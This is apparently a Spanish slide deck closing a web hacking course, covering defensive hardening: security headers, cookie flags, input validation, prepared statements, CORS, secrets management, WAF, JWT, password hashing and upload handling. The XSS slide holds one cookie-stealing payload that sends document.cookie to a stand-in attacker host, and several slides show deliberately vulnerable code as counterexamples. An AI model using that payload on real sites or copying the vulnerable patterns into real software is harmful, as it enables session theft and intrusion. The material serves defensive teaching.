# Deck 5_1 · Módulo 5 · Clase 1

---

# Defensa & Hardening
## Módulo 5 · Clase 1
### Cierre del Curso

> Curso de Web Hacking
> Del ataque a la defensa — los mismos sistemas, otra perspectiva

---

## La pregunta final

# ¿Ahora que saben atacar,
# cómo protegerían su propia app?

- Ya vieron cómo se rompe una aplicación real
- Hoy miramos el mismo sistema desde la vereda defensiva
- La meta no es “poner parches”: es diseñar controles consistentes

---

## Defensa en profundidad

| Capa | Qué protege | Ejemplos |
| --- | --- | --- |
| Network | Exposición externa | Firewall, segmentación, WAF |
| Server | Servicios y sistema operativo | Hardening, parches, permisos |
| Application | Lógica y endpoints | Validación, authz, headers |
| Data | Información sensible | Cifrado, backups, mínimos privilegios |
| User | Identidad y operación | MFA, awareness, least privilege |

**Una sola capa falla. Varias capas juntas resisten.**

---

## Regla de oro

## El frontend NO es seguridad

- JavaScript se puede leer, modificar y saltear
- Botones ocultos no equivalen a permisos
- Validaciones client-side son solo UX
- Todo request puede ser rehecho en Burp, curl o Postman

> **Conclusión:** la API y el servidor deben validar TODO, siempre.

---

## Matriz ataque → defensa del curso

| Ataque | Técnica usada | Defensa principal |
| --- | --- | --- |
| XSS | Inyectar HTML/JS | CSP + output encoding contextual |
| SQLi | Concatenar input en queries | Prepared statements |
| BOLA | Cambiar IDs de objetos | Autorización por objeto |
| Mass Assignment | Enviar campos extra | DTOs + allowlist |
| File Upload | Subir contenido ejecutable | Validación estricta + almacenamiento seguro |
| Brute Force | Probar credenciales masivamente | Rate limiting + MFA |

**Pensar como atacante ayuda a elegir controles reales.**

---

## Ciclo de Vida Seguro (SSDLC)

---

## Qué pasa cuando la seguridad llega tarde

| Fase | Sin seguridad | Consecuencia |
| --- | --- | --- |
| Requisitos | Solo funcionalidad | Controles de seguridad fuera del scope |
| Diseño | Solo arquitectura | Vulnerabilidades estructurales (BOLA, Mass Assignment) |
| Desarrollo | Código que "funciona" | SQLi, XSS, secretos en el código |
| Testing | Solo unit / integration | Sin cobertura de casos de abuso |
| Deploy | Subir y rezar | Sin hardening, secrets en texto plano |
| Monitor | Logs de errores | Sin detección de ataques en curso |

> **Shift-left:** detectar una vulnerabilidad en diseño cuesta 10× menos que en producción.

---

## Shift-Left — seguridad en cada fase

```
Requisitos → Diseño → Código → Tests → Deploy → Monitor
    |           |        |        |        |         |
  Threat     Secure    Code    SAST/  Hardening  SIEM /
  Model      Design   Review   DAST   Secrets    Alertas
```

**Cada control tiene su fase natural:**
- Code review no reemplaza pentest
- WAF no reemplaza prepared statements
- Monitoring no reemplaza validación de input

---

## HTTP Security Headers

---

## ¿Qué son los security headers?

- Son headers HTTP en la **respuesta** del servidor
- Le indican al navegador qué conductas están permitidas
- Reducen superficie de ataque sin tocar la lógica de negocio
- Son baratos de desplegar y fáciles de verificar

**Idea práctica:** son una primera línea de defensa muy efectiva contra errores comunes.

---

## Content-Security-Policy (CSP)

CSP controla **qué puede cargar y ejecutar** el navegador.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

- Limita scripts inline y orígenes externos
- Reduce impacto de XSS reflejado o almacenado
- Obliga a declarar dependencias legítimas

**Costo:** configurarla mal rompe funcionalidad. Por eso se despliega y ajusta con cuidado.

---

## HSTS, X-Frame-Options, X-Content-Type-Options

- **HSTS**: fuerza HTTPS y evita downgrade a HTTP
- **X-Frame-Options: DENY**: previene clickjacking
- **X-Content-Type-Options: nosniff**: evita MIME sniffing

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
```

Tres headers simples, muchísimo valor defensivo.

---

## Tabla rápida de headers útiles

| Header | Previene | Ejemplo |
| --- | --- | --- |
| Content-Security-Policy | XSS, carga insegura | `default-src 'self'` |
| Strict-Transport-Security | Downgrade a HTTP | `max-age=31536000` |
| X-Frame-Options | Clickjacking | `DENY` |
| X-Content-Type-Options | MIME sniffing | `nosniff` |
| Referrer-Policy | Fuga de URLs sensibles | `strict-origin-when-cross-origin` |
| Permissions-Policy | Abuso de APIs del navegador | `geolocation=()` |

---

## Headers en vivo: Juice Shop vs DVWA

### Inspección rápida con CLI y scanners

```bash
curl -I https://juice.labs.manuel-roldan.cloud
curl -I https://dvwa.labs.manuel-roldan.cloud
```

- Mirá qué headers están presentes y cuáles faltan
- Compará con [securityheaders.com](https://securityheaders.com) o [observatory.mozilla.org](https://observatory.mozilla.org)
- Documentá el gap: **qué riesgo reduce cada header ausente**

**Hábito útil:** medir antes y después de hardening.

---

## Juice Shop vs headers

Juice Shop es un lab deliberadamente vulnerable, por eso suele carecer de headers robustos.

En Express.js, una mejora inicial realista sería:

```js
import helmet from 'helmet'
app.use(helmet())
```

`helmet()` ayuda con:
- CSP básica
- `X-Content-Type-Options`
- `Referrer-Policy`
- otros defaults razonables

---

## Cookies Seguras

---

## Atributos de seguridad de cookies

- **HttpOnly**: JavaScript no puede leer la cookie
- **Secure**: solo viaja por HTTPS
- **SameSite**: restringe envío cross-site

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

Sin estos flags:
- XSS puede robar sesión
- tráfico en HTTP puede exponer cookies
- CSRF se vuelve mucho más simple

---

## SameSite explicado

| Valor | Comportamiento | Uso típico |
| --- | --- | --- |
| Strict | Nunca se envía cross-site | Paneles sensibles |
| Lax | Permite navegación top-level GET | Sesiones web comunes |
| None | Permite cross-site | SSO o integraciones; requiere `Secure` |

**Recomendación general:** `Lax` o `Strict` para cookies de sesión.

---

## Cookies — código inseguro vs seguro

**Inseguro (Node.js / Express):**

```js
res.cookie('session', token)
// Sin atributos → XSS roba la cookie, CSRF funciona, viaja por HTTP
```

**Seguro:**

```js
res.cookie('session', token, {
  httpOnly: true,    // JS no puede leer la cookie
  secure:   true,    // Solo viaja por HTTPS
  sameSite: 'lax',   // Protección básica contra CSRF
  maxAge:   3_600_000  // 1 hora de vida
})
```

Un objeto de opciones → tres vectores de ataque cerrados simultáneamente.

---

## Cookies en Burp: qué buscar

- Logueate en Juice Shop y capturá el response
- Revisá `Set-Cookie` en **Proxy** o **Repeater**
- Identificá si faltan `HttpOnly`, `Secure` o `SameSite`
- Evaluá el riesgo: ¿XSS roba sesión?, ¿CSRF sigue siendo viable?

```http
Set-Cookie: token=...; Path=/
```

Un header corto puede resumir una postura entera de seguridad.

---

## Validación de Datos

---

## Client-side vs Server-side validation

| Lado cliente | Lado servidor |
| --- | --- |
| Mejora UX | Provee seguridad real |
| Evita errores accidentales | Resiste Burp/curl/Postman |
| Fácil de bypassear | Debe ejecutarse siempre |

**Principio:** el cliente ayuda; el servidor decide.

---

## Allowlist vs Blocklist

- **Allowlist**: solo permito formatos, tamaños y valores esperados
- **Blocklist**: intento enumerar “cosas malas” conocidas

Ejemplo seguro para username:

```regex
^[a-zA-Z0-9_]{3,20}$
```

La blocklist siempre llega tarde. La allowlist parte de un modelo explícito de negocio.

---

## Prepared Statements — el fin del SQLi

Consulta vulnerable:

```sql
SELECT * FROM users WHERE email = '" + input + "'
```

Consulta segura:

```sql
SELECT * FROM users WHERE email = ?
```

```js
const [rows] = await db.execute('SELECT * FROM users WHERE email = ?', [email])
```

El driver separa datos de código SQL. Ese cambio elimina la clase entera de bug.

---

## Output encoding contextual

Cada contexto requiere encoding distinto:

| Contexto | Defensa |
| --- | --- |
| HTML | `htmlspecialchars()` / escaping templating |
| JavaScript | `JSON.stringify()` / no concatenar strings |
| URL | `encodeURIComponent()` |
| SQL | Prepared statements |

**Mensaje clave:** no existe “sanitización universal”. Existe encoding correcto para cada contexto.

---

## XSS — código vulnerable vs seguro

**Vulnerable (PHP — concatenación directa):**

```php
echo "<p>Hola, " . $_GET['name'] . "</p>";
// ?name=<script>document.location='http://attacker.com/'+document.cookie</script>
```

**Seguro (PHP — encoding contextual):**

```php
echo "<p>Hola, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
```

**En React:**

```jsx
// JSX escapa automáticamente
return <p>Hola, {name}</p>

// JAMAS con input de usuario
return <p dangerouslySetInnerHTML={{ __html: name }} />
```

---

## CORS

---

## CORS — qué es y cuándo importa

**Cross-Origin Resource Sharing** define cuándo el navegador permite requests cross-origin.

- Sin CORS, el browser bloquea lectura de respuestas entre orígenes distintos
- Con CORS, el servidor habilita excepciones controladas
- Afecta sobre todo a SPAs, APIs públicas y paneles multi-dominio

**Ojo:** CORS protege al navegador, no al backend frente a curl o Burp.

---

## CORS peligroso vs seguro

**Peligroso:**

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**Seguro:**

```http
Access-Control-Allow-Origin: https://app.midominio.com
Vary: Origin
```

Nunca reflejes el header `Origin` sin validarlo contra una lista explícita.

---

## Gestión de Secretos

---

## El problema del hardcoding

- API keys en repositorio
- passwords en `.js` del frontend
- connection strings en código fuente
- secretos filtrados en logs o commits viejos

**Ejemplo del curso:** Juice Shop deja pistas del secreto JWT en JavaScript cliente.

> Si el secreto llega al navegador, dejó de ser secreto.

---

## Buenas prácticas de secrets management

- Variables de entorno (`.env` fuera de git)
- Vault / AWS Secrets Manager / GCP Secret Manager
- Rotación periódica
- Acceso mínimo por servicio
- Nunca secretos en frontend, ejemplos, screenshots o logs

```bash
export JWT_SECRET='cambio-esto-en-produccion'
```

Seguridad madura = secretos cortos de vida y fáciles de rotar.

---

## WAF & Rate Limiting

---

## WAF — qué hace y qué NO hace

### Sí hace
- Inspeccionar tráfico HTTP
- Detectar patrones conocidos de SQLi, XSS, path traversal
- Frenar ruido automatizado y scanners básicos

### No hace
- Corregir lógica de negocio
- Reemplazar validación server-side
- Entender contexto completo de tu aplicación

**Conclusión:** es una capa adicional, no la solución.

---

## ModSecurity + OWASP CRS

- **ModSecurity**: WAF open source para Apache/Nginx
- **OWASP CRS**: reglas estándar mantenidas por la comunidad
- Estrategia sana:
  1. modo detección
  2. revisar falsos positivos
  3. endurecer gradualmente

```bash
SecRuleEngine DetectionOnly
```

Primero observá. Después bloqueá con evidencia.

---

## Rate Limiting

- Limita requests por IP, usuario, token o endpoint
- Reduce brute force, scraping y abuso automatizado
- Se aplica en Nginx, Express, API Gateways o CDN
- Combinado con **MFA** baja muchísimo el riesgo en login

```js
app.use('/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))
```

Rate limiting no arregla credenciales débiles, pero compra tiempo y fricción.

---

## JWT Seguro

---

## Errores comunes con JWT

- `alg: none` → sin firma, cualquiera forja tokens
- Secreto HS256 débil → crackeable con diccionario
- Sin `exp` → token válido para siempre
- Sin validación server-side → firma firmada pero claims no verificados
- Secreto hardcodeado en el frontend → visible en el browser

> En M4 explotamos estas debilidades. Ahora sabemos cómo cerrarlas.

---

## Cómo implementar JWT bien

| Buena práctica | Por qué importa |
| --- | --- |
| RS256 en producción | La clave privada nunca sale del servidor |
| Secreto HS256 ≥ 32 bytes random | Resiste ataques de diccionario |
| Incluir `exp`, `iat`, `nbf` | Limita ventana de validez |
| Validar firma siempre en backend | No confiar en claims sin verificar |
| Rotar y revocar tokens | Cierra sesiones comprometidas |

```js
jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1h', algorithm: 'HS256' })
```

---

## JWT — código inseguro vs seguro

**Inseguro:**

```js
const token = jwt.sign({ userId: 1, role: 'admin' }, 'secret')
// ❌ Secreto débil, sin expiración, sin algoritmo explícito

const data = jwt.decode(token)   // ❌ No verifica firma — cualquier token pasa
```

**Seguro:**

```js
const token = jwt.sign(
  { userId: 1, role: 'admin' },
  process.env.JWT_SECRET,                   // ≥ 32 bytes random
  { expiresIn: '1h', algorithm: 'HS256' }
)

jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] }, (err, payload) => {
  if (err) return res.status(401).json({ error: 'Token inválido' })
  req.user = payload
  next()
})
```

---

## Autenticación Segura

---

## Hashing de contraseñas

| Algoritmo | ¿Seguro? | Problema |
| --- | --- | --- |
| MD5 | ❌ | Roto, tablas rainbow |
| SHA-256 (solo) | ❌ | Rápido = crackeable con GPU |
| bcrypt | ✅ | Work factor configurable |
| Argon2 | ✅ | Ganador Password Hashing Competition |

```js
const hash = await bcrypt.hash(password, 12)  // work factor = 12
const ok   = await bcrypt.compare(input, hash)
```

**Nunca** guardar contraseñas en texto plano, MD5 ni SHA-1.

---

## Account Lockout y MFA

**Account lockout:**
- Limitar intentos fallidos por cuenta (no solo por IP)
- Delay exponencial: 1s → 2s → 4s → 8s...
- Alertar al usuario legítimo por email

**MFA (Multi-Factor Authentication):**
- TOTP: Google Authenticator, Authy
- WebAuthn / passkeys (más robusto)
- SMS como último recurso (vulnerable a SIM-swap)

> Un atacante con la contraseña aún necesita el segundo factor.

---

## File Upload — Defensa

---

## Cómo defender uploads de archivos

En M4 bypasseamos `getimagesize()`, magic bytes y extensiones.
La defensa real requiere múltiples capas simultáneas:

| Control | Implementación |
| --- | --- |
| Renombrar archivo | UUID + extensión controlada |
| Almacenar fuera del webroot | `/var/uploads/` no `/public/` |
| Sin permisos de ejecución | `chmod 644` en uploads |
| Validar MIME real | `finfo_file()`, no `$_FILES['type']` |
| Allowlist de extensiones | Solo `.jpg`, `.png`, `.pdf` |
| Limitar tamaño | Evita DoS por storage |
| Servir desde CDN o handler seguro | Sin URL directa al archivo |

**Principio:** el archivo nunca debe ser ejecutable ni accesible como código.

---

## File Upload — código inseguro vs seguro

**Inseguro (PHP):**

```php
$filename = $_FILES['file']['name'];                       // nombre del usuario
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$filename");
echo "Acceso: uploads/$filename";                          // URL directa → ejecución
```

**Seguro (PHP):**

```php
$allowed = ['image/jpeg', 'image/png'];
$mime    = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['file']['tmp_name']);

if (!in_array($mime, $allowed))        die('Tipo no permitido');
if ($_FILES['file']['size'] > 2000000) die('Archivo demasiado grande');

$name = bin2hex(random_bytes(16)) . '.jpg';   // nombre aleatorio
$dest = '/var/uploads/' . $name;              // fuera del webroot
move_uploaded_file($_FILES['file']['tmp_name'], $dest);
chmod($dest, 0644);                           // sin permisos de ejecución
```

---

## Logging & Alertas

---

## Qué logear (y qué NO)

### ✅ Logear siempre
- Intentos de login (exitosos y fallidos)
- Cambios de contraseña y email
- Acciones administrativas
- Errores de validación con input rechazado
- Rate limit disparado

### ❌ Nunca logear
- Contraseñas (ni hasheadas)
- Tokens y API keys completos
- Datos de tarjetas (PCI DSS)
- Datos personales sensibles (GDPR)

> Un log con passwords es un segundo vector de compromiso.

---

## Alertas útiles para seguridad

| Evento | Señal |
| --- | --- |
| 5+ logins fallidos / cuenta / minuto | Posible brute force |
| Login exitoso desde país nuevo | Anomalía geográfica |
| Tasa de 4xx > umbral normal | Fuzzing o scanner activo |
| Exportación masiva de datos | Exfiltración potencial |
| Cambio de rol o privilegios | Revisión urgente |
| Error de validación JWT frecuente | Ataque de forging |

**Herramientas:** ELK Stack, Grafana + Loki, Datadog, Splunk, CloudWatch

---

## Cierre del Curso

---

## Checklist del desarrollador seguro

- HTTPS en todos los entornos reales
- Security headers mínimos
- Cookies con `HttpOnly`, `Secure`, `SameSite`
- Validación server-side con allowlists
- Prepared statements en toda query
- Output encoding contextual
- CSP donde aplique
- MFA para paneles y cuentas críticas
- Rate limiting en login y endpoints sensibles
- File upload con validación estricta
- Dependencias actualizadas
- WAF como capa extra
- Logging y alertas útiles
- CORS con lista explícita
- Secrets fuera del código

---

## El ciclo no termina

- Nuevas vulnerabilidades aparecen cada año
- Los frameworks cambian, tus errores también
- Pentesting periódico descubre regresiones
- Bug bounty aporta mirada externa
- Monitoreo y alertas reducen tiempo de detección
- Seguir CVEs evita quedar expuesto por dependencias

# La seguridad no es un estado.
## Es un proceso continuo.

---

## Resumen de lo aprendido

- **M1**: HTTP, requests, responses, cookies, sesiones
- **M2**: SQLi, XSS inicial, CSRF, Burp básico
- **M3**: recon activo, fuzzing, Burp avanzado
- **M4**: APIs, BOLA, JWT, file upload, Metasploit
- **M5**: hardening, headers, validación, secretos y defensa en profundidad

Ahora ya pueden pensar como atacante **y** como defensor.

---

## No hay próxima clase

### Recomendaciones para seguir creciendo

- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)
- Hack The Box y TryHackMe para practicar
- Labs propios con Juice Shop, DVWA y bWAPP
- Bug bounties cuando tengan una base sólida
- Leer writeups, CVEs y postmortems reales

El curso termina. La práctica recién empieza.

---

## Gracias

### “La seguridad es responsabilidad de todos”

- Ahora saben atacar
- Úsenlo para defender mejor
- Piensen en controles antes del incidente
- Hagan de la seguridad un hábito de ingeniería
